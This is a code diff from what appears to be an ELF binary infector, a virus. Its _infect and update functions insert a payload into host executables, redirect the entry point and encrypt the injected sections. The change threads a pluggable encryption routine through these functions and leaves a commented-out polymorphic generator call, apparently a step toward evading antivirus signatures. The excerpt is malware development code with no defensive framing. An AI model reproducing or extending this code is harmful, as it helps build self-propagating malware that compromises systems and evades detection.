@@ -68,7 +68,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 	*n = (*n) + add;
 }
 
-void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, bool compressed){
+void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, bool compressed, struct s_infect_params params){
 	//add a few information about himself
 	size_t pos = 0;
 	//modifying 2bit after
@@ -81,7 +81,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt,
 	p[4] = ((uint64_t*)key)[1];
 	*(unsigned char*)(p + 3) ^= 0b01110010;
 	int c = FALSE;
-	encrypt((char*)(p+5), 15, (uint32_t*)key, &c);
+	encrypt((char*)(p+5), 15, (uint32_t*)key, &c, params.encrypt_routine);
 	get_sig(s, sn, n, (char*)(p + 7));
 }
 
@@ -114,13 +114,16 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	_insert(s, n, pos-1, p.b, p.bn);
 	//encryption
 	bool compressed;
+
+	void *route = (void*)(*s + p.decrypt_routine_off);
+	//poly_generate(&p.encrypt_routine, &route);
 	//---------- z2 (encryption without compression) -------------
 	compressed = FALSE;
-	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed) == -1)
+	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed, p.encrypt_routine) == -1)
 		return FALSE;
 	//---------- z3 (encryption with compression) ----------------
 	compressed = TRUE;
-	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed);
+	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed, p.encrypt_routine);
 	if (changed == -1)
 		return FALSE;
 	//reset it
@@ -132,7 +135,7 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	ph = (*(void**)s) + h->e_phoff;
 	//TODO: check not already inf
 	//ph[x].p_memsz += changed;
-	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, compressed);
+	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, compressed, p);
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
